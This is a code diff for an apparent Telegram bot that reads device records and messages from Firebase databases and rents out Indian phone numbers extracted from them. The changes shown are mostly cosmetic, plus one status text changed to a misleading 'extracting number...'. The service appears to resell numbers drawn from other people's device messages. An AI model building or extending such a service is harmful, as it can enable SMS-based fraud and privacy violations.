@@ -2,8 +2,7 @@ from aiogram import Router, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
 from aiogram.filters import CommandStart, Command
 from aiogram.fsm.context import FSMContext
-import random, time, asyncio
-import logging
+import random, time, asyncio, logging
 import database as db
 import firebase_utils as fbu
 from utils.ui import sc, btn
@@ -23,7 +22,6 @@ def main_kb():
 async def cmd_start(msg: Message):
     uid = msg.from_user.id
     log.info(f"START RECEIVED FROM: {uid} | Config Owner: {config.MAIN_OWNER} | Is Owner: {uid == config.MAIN_OWNER}")
-    
     d = db.load_data()
     clear_user_lease(uid)
     if str(uid) not in d["users"]:
@@ -68,7 +66,7 @@ async def user_country(cq: CallbackQuery):
         kb.append([btn(f"server {i+1} ({ping})", f"user:server:{country}:{i}", "📁")])
     kb.append([btn("back", "user:get_num", "🔙")])
     await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-2
+
 @user_router.callback_query(F.data.startswith("user:server:"))
 async def user_server(cq: CallbackQuery):
     await cq.answer()
@@ -84,13 +82,13 @@ async def user_server(cq: CallbackQuery):
     
     used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
     now = int(time.time())
-    
     async def fetch_clients_data(fb):
         clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
         return fb, clients
         
     tasks = [fetch_clients_data(fb) for fb in servers[idx]]
     results = await asyncio.gather(*tasks)
+    
     available, repeat, all_devs = [], [], []
     for fb_i, (fb, clients) in enumerate(results):
         if not clients or not isinstance(clients, dict): continue
@@ -102,6 +100,7 @@ async def user_server(cq: CallbackQuery):
                 last_used = used.get(dev_id, 0)
                 if now - last_used > 86400: available.append((fb_i, fb, dev_id, c))
                 elif now - last_used > 43200: repeat.append((fb_i, fb, dev_id, c))
+                
     is_rep = False
     if available: fb_i, fb, dev_id, dev_data = random.choice(available)
     elif repeat: fb_i, fb, dev_id, dev_data = random.choice(repeat); is_rep = True
@@ -116,11 +115,12 @@ async def user_server(cq: CallbackQuery):
     last_id = int(msgs[-1].get("id", 0)) if msgs else 0
     
     best_nums = fbu.extract_best_numbers(dev_data, msgs)
-    
+    is_backup = False
     if not best_nums:
         backups = data.get("device_backups", {}).get(dev_id, {}).get("numbers", [])
         if backups:
             best_nums = [(n, "Backup") for n in backups]
+            is_backup = True
 
     real_health = fbu.calculate_health(msgs)
     base_label = fb.get("label", f"Base {fb_i+1}")
@@ -135,6 +135,7 @@ async def user_server(cq: CallbackQuery):
     is_vip = uid in data.get("vip_users", []) or is_owner(uid)
     display_health = real_health if is_vip else 10
     rep_mark = " #" if is_rep else ""
+    ping_mark = " (P)" if dev_data.get("status") is not True else ""
     
     nums_text = ""
     kb_nums = []
@@ -144,17 +145,16 @@ async def user_server(cq: CallbackQuery):
             nums_text += f"📞 <code>+91{n}</code> | {conf_text}\n"
             kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
     else:
-        nums_text = f"⚠️ <b>{sc('no number found...')}</b>"
+        nums_text = f"⚠️ <b>{sc('extracting number...')}</b>"
         
     battery = str(dev_data.get("battery", "100")).replace("%", "")
     if not battery or battery == "?": battery = "100"
-    
     rent_id_disp = dev_id if not best_nums else f"{dev_id[:12]}..."
     
     text = (
         f"📱 <b>{sc('details')}</b>\n"
         f"🔥 {sc('srv')}: {idx+1} | {base_label}\n"
-        f"🆔 <code>{rent_id_disp}</code>{rep_mark} | ⚙️ {battery}T | ❤️ {display_health}/10\n\n"
+        f"🆔 <code>{rent_id_disp}</code>{rep_mark}{ping_mark} | ⚙️ {battery}T | ❤️ {display_health}/10\n\n"
         f"{nums_text}"
     )
     kb = kb_nums + [
